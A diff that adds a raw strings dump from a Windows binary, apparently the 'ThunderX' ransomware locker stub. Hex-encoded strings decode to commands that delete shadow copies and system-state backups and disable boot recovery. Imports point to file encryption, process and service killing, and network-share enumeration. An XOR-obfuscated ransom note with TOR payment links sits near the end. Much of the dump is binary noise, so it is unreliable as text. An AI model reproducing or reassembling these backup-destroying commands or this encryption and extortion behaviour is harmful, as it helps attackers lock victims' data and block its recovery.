@@ -1,0 +1,567 @@
+!This program cannot be run in DOS mode.
+@nYmIo
+@nYmBo
+@nRich
+`.rdata
+@.data
+6SPQVj
+RRSPQVRh
+QQSVWj
+3s43S83K<
+CD$XPV
+L$d_^[3
+D$hSVW
+D$$RQSP
+D$,QRPV
+CD$hPV
+CD$hPV
+\$,PSSV
+L$t_^[3
+D$pSVW
+D$(9\$
+CD$pPV
+CD$pPV
+L$4;L$
+\$<PSSV
+L$|_^[3
+\$ PSSV
+D$09\$
+CL$DWQV
+L$T_^[3
+6SPQVj
+D$0SVW
+6Wj,VP
+tWSSSh
+QQSVWd
+URPQQh@
+;t$,v-
+UQPXY]Y[
+PPPPPWS
+PP9E u:PPVWP
+tlj*Yf
+f9:t!V
+QQSVj8j@
+PPPPPPPP
+bad allocation
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+operator<=>
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`anonymous namespace'
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+GetSystemTimePreciseAsFileTime
+LCMapStringEx
+LocaleNameToLCID
+RoInitialize
+RoUninitialize
+AppPolicyGetProcessTerminationMethod
+AppPolicyGetThreadInitializationType
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+Unknown exception
+bad array new length
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+string too long
+invalid stoi argument
+stoi argument out of range
+476C6F62616C5C33353335354641352D303745392D343238422D423541352D314338384341423242343838
+726561646D652E747874
+776D69632E65786520534841444F57434F5059202F6E6F696E746572616374697665
+776261646D696E2044454C4554452053595354454D53544154454241434B5550
+776261646D696E2044454C4554452053595354454D53544154454241434B5550202D64656C6574654F6C64657374
+626364656469742E657865202F736574207B64656661756C747D207265636F76657279656E61626C6564204E6F
+626364656469742E657865202F736574207B64656661756C747D20626F6F74737461747573706F6C6963792069676E6F7265616C6C6661696C75726573
+76737361646D696E2E6578652044656C65746520536861646F7773202F416C6C202F5175696574
+433A5C50726F6772616D2046696C65735C4D6963726F736F66742053514C20536572766572
+433A5C50726F6772616D2046696C65732028783836295C4D6963726F736F66742053514C20536572766572
+534F4654574152455C4D6963726F736F66745C45524944
+7B5041545445524E5F49447D
+7B4558547D
+7B5549447D
+22657874223A22
+226B6579223A22
+226E6574776F726B223A22
+227375626964223A22
+226C616E67223A22
+invalid string position
+vector too long
+expand 32-byte k
+expand 16-byte k
+expand 32-byte k
+expand 16-byte k
+C:\Users\Gh0St\Desktop\ThunderX\Release\LockerStub.pdb
+.text$di
+.text$mn
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$r
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.rsrc$01
+.rsrc$02
+WriteFile
+GetUserDefaultLocaleName
+CreateFileW
+MultiByteToWideChar
+CloseHandle
+GetModuleHandleW
+WideCharToMultiByte
+ReadFile
+GetFileSizeEx
+HeapFree
+GetFileAttributesW
+SetFileAttributesW
+GetLastError
+HeapAlloc
+SetFilePointerEx
+MoveFileExW
+GetProcessHeap
+FindFirstFileW
+FindNextFileW
+FindClose
+PostQueuedCompletionStatus
+GetLogicalDrives
+GetCurrentProcess
+TerminateProcess
+CreateMutexA
+WaitForSingleObject
+OpenProcess
+CreateToolhelp32Snapshot
+OpenMutexA
+Process32NextW
+GetCurrentThread
+Process32FirstW
+GetThreadContext
+CreateProcessA
+GetTickCount
+IsDebuggerPresent
+CheckRemoteDebuggerPresent
+GetQueuedCompletionStatus
+GetSystemInfo
+CreateThread
+CreateIoCompletionPort
+KERNEL32.dll
+LoadStringW
+USER32.dll
+CryptReleaseContext
+CryptGenKey
+CryptImportKey
+CryptSetKeyParam
+CryptGenRandom
+CryptEncrypt
+CryptAcquireContextW
+CryptDestroyKey
+QueryServiceStatusEx
+OpenServiceW
+EnumDependentServicesW
+ControlService
+OpenSCManagerW
+CloseServiceHandle
+ADVAPI32.dll
+SHEmptyRecycleBinW
+SHELL32.dll
+CryptStringToBinaryA
+CRYPT32.dll
+WNetGetConnectionW
+MPR.dll
+IcmpSendEcho
+IcmpCloseHandle
+GetAdaptersInfo
+IcmpCreateFile
+IPHLPAPI.DLL
+NetShareEnum
+NetDfsEnum
+NetApiBufferFree
+NETAPI32.dll
+getnameinfo
+WS2_32.dll
+RmRegisterResources
+RmGetList
+RmStartSession
+RmShutdown
+RmEndSession
+RstrtMgr.DLL
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsProcessorFeaturePresent
+GetStartupInfoW
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+RtlUnwind
+RaiseException
+SetLastError
+EncodePointer
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+GetProcAddress
+LoadLibraryExW
+ExitThread
+FreeLibraryAndExitThread
+GetModuleHandleExW
+ExitProcess
+GetModuleFileNameW
+GetStdHandle
+LCMapStringW
+FindFirstFileExW
+IsValidCodePage
+GetACP
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+GetFileType
+SetStdHandle
+GetStringTypeW
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+WriteConsoleW
+DecodePointer
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVinvalid_argument@std@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+.?AVbad_exception@std@@
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVbad_array_new_length@std@@
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+Aapi-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+Aapi-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l1-2-2
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+api-ms-win-appmodel-runtime-l1-1-2
+user32
+ext-ms-
+Aja-JP
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+Microsoft Enhanced Cryptographic Provider v1.0
+-nolan
+\yW___]u__\MK.[f__y___[__OZ\H[IV/JI)kkzRiyp)tFWutsgZlV'F/RkhrZ.x|j/]PHpmgn(OuzM-*R\HvkPSpL,IDXnI}fzlSJQYfrpxpQ}(MDXnZVsR*P5{'/+p.[WQuZy*fXNyL
+*z1QNRIuVFV[md1vyylTN5sYlqW{{rd{g|WFnxqOGd*tqUgU]_TMqKWnY'rgI[t.*|fdd/\KnMTyH.f)oMG.}w{u,GKLkP(&yDg{Ddwn'z]\Ns\KLJ'\*rnyFlyW{Th+Utm]&Rq5hiLVNvlvFYx(QSlIDZl|
+|JWqUt,)hvS
+M*pn,Ynk(Zx.R]&(+{ZwHT|ZyTh|if/)\i-dZhy
+1XXv{-ST&ysVQ5
+2Nlqyl
+s>Xwr{m2Nlqyl
+s>Xwr{m>6f&(72_nnZ
+2|qqj2N{lxRqym2Nlqyl
+2Yqqyr{2Wpj{r2Sw}lqmqxj2_nnrw}
+jwqp>Z
+2Jql>\lqim{l2Iwpzqim
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+0{f{20zrr20mgm20tmqp20u{g
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+iwpiqlz0{f{2hwmwq0{f{2{p}mh}0{f{2sgmorzAqnj0{f{2q}mmz0{f{2jv{|
+j0{f{2q}qss0{f{2qkjrqqu0{f{2qp{pqj{0{f{2morilwj{l0{f{2sm
+}}{mm0{f{2sgmorz0{f{2mor
+y{pj0{f{2morm{lhl0{f{2wpxqn
+jv0{f{2mor|lqim{l0{f{2jvkpz{l|wlz0{f{2smxj{mor0{f{2iqlzn
+z0{f{2mgp}jws{0{f{2
+ypjmh}0{f{2z|mpsn0{f{2sgz{mujqnm{lhw}{0{f{2q}
+kjqknzm0{f{2jv{|
+j(*0{f{2mo|}ql{m{lhw}{0{f{2wmornrkmmh}0{f{2ql
+}r{0{f{2j|wlz}qpxwy0{f{2sgmorzApj0{f{
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+hsw}uhn{f}v
+py{2hsw}yk{mjwpj{lx
+}{2hsw}mvkjzqip2hsw}v{
+j2SMMORXZR
+kp}v{l2SMMORM[LH[L2MOR\lqim{l2MORM[LH[L_Y[PJ2MORIlwj{l2SMMOR2ILMH]2{ulp
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+iwn{As{2|
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A0hvzf20hvz20
+0000000000000000000000000000000000000000000000
+333###>L
+pdg>Rq}u{l>/0/>###333
+_jj{pjwqp?>Gqkl>p{jiqlu>v
+m>|{{p>rq}u{z0
+Gqkl>}qsnkj{lm>
+pz>m{lh{l>
+l{>rq}u{z>pqi0
+_rr>{p}lgnj{z>xwr{m>v
+h{>{fj{pmwqp$>e[FJc
+3333>Vqi>jq>l{mjql{>sg>xwr{m!>3333
+_rr>xwr{m>qp>{
+}v>vqmj>wp>gqkl>p{jiqlu>{p}lgnj{z>iwjv>mjlqpy{mj>{p}lgnjwqp>
+ryqlwjvsm
+}uknm>
+l{>z{r{j{z>ql>xqls
+jj{z2>zq>pqj>iqllg2>i{>}
+p>v{rn>gqk>l{mjql{>gqkl>xwr{m
+Xwr{m>}
+p>|{>z{}lgnj{z>qprg>iwjv>nlwh
+j{>u{g>3>jvwm>u{g>mjql{z>qp>qkl>m{lh{lm
+h{>qprg>qp{>i
+g>xql>l{jklp>gqkl>xwr{m>|
+}u>3>}qpj
+}j>km>
+pz>l{}{wh{>kpwh{lm
+r>z{}lgnjwqp>nlqyl
+Zq>pqj>iqllg>
+|qkj>yk
+pj{{m>3>gqk>}
+p>z{}lgnj>
+pg>->xwr{m>XQL>XL[[>
+3333>]qpj
+}j>km>3333
+h{>jiq>i
+g>jq>}qpj
+}j>km$
+/0>Qn{p>qkl>l{}qh{lg3i{|mwj{>6}
+p>|{>qn{p>wp>
+pg>|lqim{l7$>vjjnm$11l
+pdgrq}u0vu1P(]X\NGF
+,0>Wp>}
+m{>qx>rwpu>zq{mpj>iqlu>qn{p>qkl>swllql>l{}qh{lg3i{|mwj{>hw
+>JQL>\lqim{l$>
+>>>>>Zqiprq
+z>JQL>\lqim{l>v{l{$>vjjnm$11iii0jqlnlqt{}j0qly1zqiprq
+>>>>>Qn{p>JQL>swllql>i{|mwj{$>vjjn$11
++|*nnpulwq-pwugkjx{f|}(g+z}(uxvt-tl-,uzi|lgl,r{snukgz0qpwqp1P(]X\NGF
+3333>Z
+u>_jj{pjwqp>3333
+???>_rr>gqkl>m{pmwjwh{>z
+m>zqiprq
+z{z>jq>qkl>m{lh{lm
+???>I{>
+zg>jq>nk|rwmv>jvwm>z
+>wp>qkl>|rqy>iwjv>gqkl>]qsn
+s{2>wx>gqk>iwrr>pqj>}qpj
+}j>iwjv>km>|g>{s
+???>Qprg>i{>}
+p>z{r{j{>gqkl>xwr{m>xlqs>qkl>m{lh{lm
+???>Qprg>i{>}
+p>l{mjql{>
+rr>gqkl>xwr{m>iwjvqkj>
+pg>RQMM
+3333>L{}qh{lg>wpxqls
+jwqp>3333
+u{g$>eN_JJ[LPAWZc
+n{lmqp
+r>wz$>eKWZc
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+/.[UHNWV
+000000000000000000000
